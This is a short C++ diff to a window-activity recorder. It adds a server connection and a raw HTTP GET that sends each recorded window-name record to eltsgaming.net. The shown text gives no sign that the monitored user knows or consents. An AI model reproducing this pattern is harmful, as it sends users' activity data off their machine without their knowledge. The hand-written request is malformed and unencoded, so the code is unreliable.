@@ -10,6 +10,17 @@ WindowRecorder::WindowRecorder()
 	timeInSeconds = 0.0f;	
 	screenshotTime = 0.0f;
 
+	/* Connect to the server */
+	try 
+	{
+		stream.startUp();
+		stream.connectToServer();
+	}
+	catch (std::exception e)
+	{
+		std::cout << e.what() << std::endl;
+	}
+
 	trackedPrograms();
 }
 
@@ -293,7 +304,16 @@ void WindowRecorder::outputWindowName()
 
 			std::cout << data.toString();
 			out << data.toString();
-					
+			
+			try
+			{
+				stream.sendData("GET /index.php?goro=" + data.toString() +" http/1.1\nHOST: eltsgaming.net\n\n");
+			}
+			catch (std::exception e)
+			{
+				std::cout << e.what() << std::endl;
+			}
+
 			out.close();
 			data.resetAll();		/* Clear all data */
 			timeStart = time(0);	/* Reset the timer */
